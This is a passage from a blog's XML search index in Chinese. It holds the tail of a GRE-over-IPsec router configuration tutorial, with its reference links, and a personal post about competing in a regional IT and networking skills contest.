next-hop-interface tun0<br>commit ; save<br></code></pre></td></tr></table></figure><p>完成這些設定後，在兩個peer間就建立了GRE over IPsec tunnel</p><h2 id="參考">參考</h2><section class="footnotes"><div class="footnote-list"><ol><li><span id="fn:1" class="footnote-text"><span><a href="https://support.vyos.io/support/solutions/articles/103000096326-gre-over-ipsec-for-secure-tunneling"> GRE Over IPsec for Secure Tunneling : VyOS Support Portal </a><a href="#fnref:1" rev="footnote" class="footnote-backref"> ↩</a></span></span></li><li><span id="fn:2" class="footnote-text"><span><a href="https://dn42.eu/howto/EdgeOS-GRE-IPsec-Example">howto/EdgeOS GRE IPsec Example</a><a href="#fnref:2" rev="footnote" class="footnote-backref"> ↩</a></span></span></li><li><span id="fn:3" class="footnote-text"><span><a href="https://github.com/iisti/how-to-usg-mikrotik-ipsec-vpn">How to create an IPsec VPN between Unifi USG and Mikrotik firewalls</a><a href="#fnref:3" rev="footnote" class="footnote-backref"> ↩</a></span></span></li><li><span id="fn:4" class="footnote-text"><span><a href="https://docs.google.com/document/d/13WTT3wZgejNWP0EPNeKQ24XXCVFM3g521doVrzeHqtg/edit">EdgeRouter to MikroTik IPSec VPN</a><a href="#fnref:4" rev="footnote" class="footnote-backref"> ↩</a></span></span></li><li><span id="fn:5" class="footnote-text"><span><a href="https://forum.mikrotik.com/viewtopic.php?t=108227">Dummy or Loopback interface</a><a href="#fnref:5" rev="footnote" class="footnote-backref"> ↩</a></span></span></li><li><span id="fn:6" class="footnote-text"><span><a href="https://forum.mikrotik.com/viewtopic.php?t=187390">loopback interface in mikrotik</a><a href="#fnref:6" rev="footnote" class="footnote-backref"> ↩</a></span></span></li><li><span id="fn:7" class="footnote-text"><span><a href="https://help.ui.com/hc/en-us/articles/205231690-EdgeRouter-GRE-Tunnel">EdgeRouter - GRE Tunnel </a><a href="#fnref:7" rev="footnote" class="footnote-backref"> ↩</a></span></span></li><li><span id="fn:8" class="footnote-text"><span><a href="https://wiki.mikrotik.com/wiki/Manual:IP/IPsec">Manual:IP/IPsec - MikroTik Wiki</a><a href="#fnref:8" rev="footnote" class="footnote-backref"> ↩</a></span></span></li><li><span id="fn:9" class="footnote-text"><span><a href="https://help.ui.com/hc/en-us/articles/204961754-EdgeRouter-EoGRE-Layer-2-Tunnel">EdgeRouter - EoGRE Layer 2 Tunnel</a><a href="#fnref:9" rev="footnote" class="footnote-backref"> ↩</a></span></span></li><li><span id="fn:10" class="footnote-text"><span><a href="https://community.ui.com/questions/GRE-over-IPSec-tunnel/7f1bc5c4-ba65-4c6f-a8f5-7c2fd3135693">GRE over IPSec tunnel</a><a href="#fnref:10" rev="footnote" class="footnote-backref"> ↩</a></span></span></li><li><span id="fn:11" class="footnote-text"><span><a href="https://help.ui.com/hc/en-us/articles/216771078-EdgeRouter-Modifying-the-Default-IPsec-Site-to-Site-VPN#3">EdgeRouter - Modifying the Default IPsec Site-to-Site VPN</a><a href="#fnref:11" rev="footnote" class="footnote-backref"> ↩</a></span></span></li></ol></div></section>]]></content>
    
    
    <categories>
      
      <category>教程</category>
      
    </categories>
    
    
    <tags>
      
      <tag>network</tag>
      
      <tag>UBNT</tag>
      
      <tag>Ubiquiti</tag>
      
      <tag>EdgeOS</tag>
      
      <tag>Mikrotik</tag>
      
      <tag>RouterOS</tag>
      
      <tag>GRE over IPsec</tag>
      
      <tag>IPsec</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>54屆技能競賽南區區賽 - 39 資訊與網路技術</title>
    <link href="/54th-skills39-south-area/"/>
    <url>/54th-skills39-south-area/</url>
    
    <content type="html"><![CDATA[<h1 id="前言">前言</h1><p>比賽都結束了一個月才來寫文章會不會太晚 = =</p><p>這個比賽是<a href="https://blog.chummydns.com/">chummy</a><sup id="fnref:1" class="footnote-ref"><a href="#fn:1" rel="footnote"><span class="hint--top hint--rounded" aria-label="[Chummy的Blog](https://blog.chummydns.com/)">[1]</span></a></sup>推薦我去參加的，以他的話來說就是這個比賽很水，不去拿錢嗎。實際比了一次之後，的確很水，不過我太混了，比賽前一週才開始準備，沒拿到獎金…</p><h1 id="簡介">簡介</h1><p>分區賽的項目分為兩部分，都是在沒有外部網路連線的環境比賽</p><ul><li>Networking</li><li>OS</li></ul><p>Networking是1.5小時的賽程，主要是使用Cisco Packet  Tracer按照試題的各項要求完成switch和router的配置</p><p>OS是4.5小時的賽程，會有兩台主機、幾張網卡和網路分享器，需要在主機上搭建虛擬機，安裝操作系統，完成試題上要求配置的項目，主要就是windows server和linux server的配置。大部分人也是把重心放在這</p><h1 id="想法">想法</h1><p>這算是我第一次參加這種類型的比賽，感覺還是挺有趣的，只是自己太混，基本沒有準備，只拿到第四。</p><p>Networking的那部份，我直到比賽的那週一才註冊netadad的帳號下載cisco packet tracer，比賽前一天還撞到工程數學的期中，所以基本上只練到兩個晚上左右，不過以前有接觸過cisco的switch，上手還算快，練習時遇到不會配的，<a href="https://www.jannet.hk/home-zh-hant/">這個網站</a><sup id="fnref:2" class="footnote-ref"><a href="#fn:2" rel="footnote"><span class="hint--top hint--rounded" aria-label="[Jan Ho 的網絡世界](https://www.jannet.hk/home-zh-hant/)">[2]</span></a></sup>也基本上可以教你，不過比賽時還是沒有配完所有的要求，一方面是不太熟悉，常常要翻指令，另一方面是有些要求沒配過，也找不到要再哪裡配，就只能放掉。</p><p>OS的部分差不多準備了三、四個晚上，基本都是準備windows server的部分，算是從0開始學習，真的要感謝chummy教我windows server的配置，比賽前一天他還幫我複習這部份。題目倒是不算太難，不過linux server很多地方沒有拿到分，第一眼看題目感覺我應該都會，結果因為沒有複習，全是靠以前配的記憶，忘記了幾個關鍵的配置，就變成：欸怎麼服務都起不來？反而初次接觸的windows server配置幾乎全配完了，有點尷尬</p><p>比賽基本上就是這樣，第一次比，感覺初賽倒是不難，只要不裸考應該都能拿好成績，反正今年就當試水，明年可以再打一次，下次努力一點去拿錢。</p><h2 id="參考">參考</h2><section class="footnotes"><div class="footnote-list"><ol><li><span id="fn:1" class="footnote-text"><span><a href="https://blog.chummydns.com/">Chummy的Blog</a><a href="#fnref:1" rev="footnote" class="footnote-backref"> ↩</a></span></span></li><li><span id="fn:2" class="footnote-text"><span><a href="https://www.jannet.hk/home-zh-hant/">Jan Ho 的網絡世界</a><a href="#fnref:2" rev="footnote" class="footnote-backref"> ↩</a></span></span></li></ol></div></section>]]></content>
    
    
    <categories>
      
      <category>比賽</category>
      
    </categories>
    
    
    <tags>
      
      <tag>network</tag>
      
      <tag>server</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
